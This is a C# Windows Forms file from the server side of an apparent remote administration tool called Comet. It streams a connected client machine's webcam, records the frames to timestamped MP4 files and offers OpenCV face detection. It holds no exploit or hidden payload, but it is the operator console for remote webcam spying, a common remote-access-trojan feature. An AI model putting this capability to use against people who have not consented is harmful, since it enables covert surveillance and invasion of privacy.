using Comet.Common.Messages;
using Comet.Common.Video;
using Comet.Server.Helper;
using Comet.Server.Messages;
using Comet.Server.Networking;
using Comet.Server.Utilities;
using Microsoft.Extensions.ObjectPool;
using Mono.Cecil.Cil;
using OpenCvSharp;
using OpenCvSharp.Extensions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

namespace Comet.Server.Forms
{
    public partial class FrmRemoteWebcam : Form
    {
        /// <summary>
        /// The client which can be used for the task manager.
        /// </summary>
        private readonly Client _connectClient;
        Dictionary<string, List<Resolution>> _webcams = null;
        private readonly CascadeClassifier cascadeClassifier;

        public bool IsStarted { get; private set; }

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly RemoteWebcamHandlerS _remoteWebcamHandler;

        public FrmRemoteWebcam(Client client)
        {
            _connectClient = client;
            _remoteWebcamHandler = new RemoteWebcamHandlerS(client);
            RegisterMessageHandler();
            cascadeClassifier = new CascadeClassifier("haarcascade_frontalface_default.xml");
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _remoteWebcamHandler.DisplaysChanged += DisplaysChanged;
            _remoteWebcamHandler.ProgressChanged += UpdateImageAsync;
            MessageHandler.Register(_remoteWebcamHandler);
        }

        /// <summary>
        /// Unregisters the remote desktop message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_remoteWebcamHandler);
            _remoteWebcamHandler.DisplaysChanged -= DisplaysChanged;
            _remoteWebcamHandler.ProgressChanged -= UpdateImageAsync;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void DisplaysChanged(object sender, Dictionary<string, List<Resolution>> webcams)
        {
            cbWebcams.Items.Clear();
           _webcams=webcams;
            foreach (var webcam in webcams.Keys)
            {
                cbWebcams.Items.Add(webcam);
            }
            cbWebcams.SelectedIndex = 0;
        }

        //Record
        private VideoWriter videoWriter;
        bool record = false;
        bool faceDetection = false;
        Stopwatch stopwatch = new Stopwatch();
        private readonly Queue<Mat> frameQueue = new Queue<Mat>();
        private readonly object queueLock = new object();
        private Task videoWriteTask;
        private CancellationTokenSource cancellationTokenSource;

        private Task recordTask;

        private async void UpdateImageAsync(object sender, Bitmap bmp)
        {
            if (WindowState == FormWindowState.Minimized)
                return;

            if (faceDetection)
            {
                FaceDetection(bmp);
            }
            else
            {
                picWebcam.UpdateImage(bmp, false);
            }

            if (record)
            {
                int imgWidth = bmp.Size.Width;
                int imgHeight = bmp.Size.Height;

                if (videoWriter == null)
                {
                    InitializeVideoWriter(imgWidth, imgHeight);
                }

                // 异步处理帧，避免阻塞UI
                await ProcessFrameAsync(bmp, imgWidth, imgHeight);
            }
        }

        private void InitializeVideoWriter(int width, int height)
        {
            string mp4_file = Path.Combine(
                Directory.GetCurrentDirectory(),
                @"Record\Webcam",
                DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".mp4"
            );

            // 使用更高效的编码器
            videoWriter = new VideoWriter(mp4_file, FourCC.MP4V, 20, new OpenCvSharp.Size(width, height));

            cancellationTokenSource = new CancellationTokenSource();

            // 启动后台写入任务
            videoWriteTask = Task.Run(() => VideoWriteWorker(cancellationTokenSource.Token));
        }

        private async Task ProcessFrameAsync(Bitmap bmp, int imgWidth, int imgHeight)
        {
            await Task.Run(() =>
            {
                try
                {
                    using (var frame = ImageToMat(bmp))
                    {
                        if (frame.Width != imgWidth || frame.Height != imgHeight)
                        {
                            Cv2.Resize(frame, frame, new OpenCvSharp.Size(imgWidth, imgHeight));
                        }

                        // 将帧添加到队列而不是直接写入
                        lock (queueLock)
                        {
                            if (frameQueue.Count < 30) // 限制队列大小，避免内存溢出
                            {
                                frameQueue.Enqueue(frame.Clone());
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // 记录错误
                    Log($"ProcessFrame error: {ex.Message}");
                }
                finally
                {
                    bmp?.Dispose();
                }
            });
        }

        private void VideoWriteWorker(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                Mat frameToWrite = null;

                lock (queueLock)
                {
                    if (frameQueue.Count > 0)
                    {
                        frameToWrite = frameQueue.Dequeue();
                    }
                }

                if (frameToWrite != null)
                {
                    try
                    {
                        stopwatch.Restart();
                        videoWriter.Write(frameToWrite);
                        stopwatch.Stop();

                        Log($"Write time: {stopwatch.ElapsedMilliseconds}ms, Queue size: {frameQueue.Count}");
                    }
                    catch (Exception ex)
                    {
                        Log($"VideoWrite error: {ex.Message}");
                    }
                    finally
                    {
                        frameToWrite.Dispose();
                    }
                }
                else
                {
                    // 没有帧时短暂休眠
                    Thread.Sleep(1);
                }
            }
        }

        // 停止录制时的清理
        private void StopRecording()
        {
            record = false;

            if (cancellationTokenSource != null)
            {
                cancellationTokenSource.Cancel();
                videoWriteTask?.Wait(5000); // 等待最多5秒
            }

            // 清空队列
            lock (queueLock)
            {
                while (frameQueue.Count > 0)
                {
                    var frame = frameQueue.Dequeue();
                    try
                    {
                        videoWriter?.Write(frame);
                    }
                    finally
                    {
                        frame.Dispose();
                    }
                }
            }

            videoWriter?.Release();
            videoWriter = null;
        }

        // 进一步优化：使用内存池
        private readonly ObjectPool<Mat> matPool = new DefaultObjectPool<Mat>(new MatPoolPolicy());

        private class MatPoolPolicy : IPooledObjectPolicy<Mat>
        {
            public Mat Create() => new Mat();

            public bool Return(Mat obj)
            {
                if (obj != null && !obj.IsDisposed)
                {
                    obj.SetTo(Scalar.All(0)); // 清空内容
                    return true;
                }
                return false;
            }
        }
        public static void Log(string message)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("1.log"))
                {
                    sw.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {message}\r\n");
                }
            }
            catch (Exception ex)
            {
                // 处理日志写入失败的情况
                Console.WriteLine($"无法写入日志: {ex.Message}");
            }
        }
        private Mat ImageToMat(System.Drawing.Image img)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                img.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                ms.Seek(0, SeekOrigin.Begin);

                return Mat.ImDecode(ms.ToArray(), ImreadModes.Color);
            }
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);
            _remoteWebcamHandler.RefreshDisplays();
            _remoteWebcamHandler.LocalResolution = picWebcam.Size;
            OnResize(EventArgs.Empty); // 触发调整大小事件以对齐控件
            if (!Directory.Exists(@"Record\Webcam"))
            {
                Directory.CreateDirectory(@"Record\Webcam");
            }
        }
        // <summary>
        /// Holds the opened Webcam form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();
        public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteWebcam f = new FrmRemoteWebcam(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }
        private void recordCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (((CheckBox)sender).Checked)
            {
                record = true; 
            }
            else
            {
                record = false;
                StopRecording();
            }
        }

        private async void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            record = false;
            // all cleanup logic goes here
            if (_remoteWebcamHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _remoteWebcamHandler.Dispose();
            picWebcam.Image?.Dispose();
            _connectClient.Send(new DoWebcamStop());
            StopRecording();
        }

        /// <summary>
        /// Stops the remote Webcam stream.
        /// </summary>
        private void StopStream()
        {
            ToggleConfigurationControls(false);
            picWebcam.Stop();
            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
            this.ActiveControl = picWebcam;
            _remoteWebcamHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Webcam", _connectClient), e.CurrentFramesPerSecond.ToString("0"));//"0"不保留小数点
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            //barQuality.Enabled = !started;
            cbWebcams.Enabled = !started;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbWebcams.Items.Count == 0)
            {
                MessageBox.Show("No webcam detected.\nPlease wait till the client sends a list with available webcams.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            ToggleControls(false);
            picWebcam.Start();
            picWebcam.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
            this.ActiveControl = picWebcam;
            _connectClient.Send(new GetWebcam
            {
                Webcam = cbWebcams.SelectedIndex,
                Resolution = cbResolutions.SelectedIndex
            });
            recordCheckBox.Enabled = true;
            
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleControls(true);
            this.ActiveControl = picWebcam;
            _connectClient.Send(new DoWebcamStop());
            recordCheckBox.Enabled = false;
            faceDetection = false;
        }

        public void ToggleControls(bool state)
        {
            IsStarted = !state;

            cbWebcams.Enabled = cbResolutions.Enabled = btnStart.Enabled = state;
            btnStop.Enabled = !state;
        }

        private void cbWebcams_SelectedIndexChanged(object sender, EventArgs e)
        {
            cbResolutions.Invoke((MethodInvoker)delegate
            {
                cbResolutions.Items.Clear();
                foreach (var resolution in this._webcams.ElementAt(cbWebcams.SelectedIndex).Value)
                {
                    cbResolutions.Items.Add(resolution.ToString());
                }
                cbResolutions.SelectedIndex = 0;
            });
        }

        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;
            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);

            //btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);

            btnShow.Location = new System.Drawing.Point(377, 0);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
            //_remoteWebcamHandler.LocalResolution = picWebcam.Size;
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            HideWin();
        }

        void HideWin() 
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
            this.ActiveControl = picWebcam;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
            this.ActiveControl = picWebcam;
        }

        void FaceDetection(Bitmap detectBitmap)
        {
            if (detectBitmap != null)
            {
                using (var detectMat = BitmapConverter.ToMat(detectBitmap))
                {
                    // 检测人脸
                    var rects = cascadeClassifier.DetectMultiScale(
                        detectMat,
                        1.1,
                        5,
                        HaarDetectionTypes.ScaleImage,
                        new OpenCvSharp.Size(30, 30)
                    );
                    // 绘制所有检测到的人脸
                    foreach (var rect in rects)
                    {
                        Cv2.Rectangle(detectMat, rect, Scalar.Red, 2);
                    }
                    picWebcam.UpdateImage(BitmapConverter.ToBitmap(detectMat), false);
                }
            }
        }

        private void faceDetectioncheckBox_CheckedChanged(object sender, EventArgs e)
        {
            faceDetection = ((CheckBox)sender).Checked;
        }
    }
}
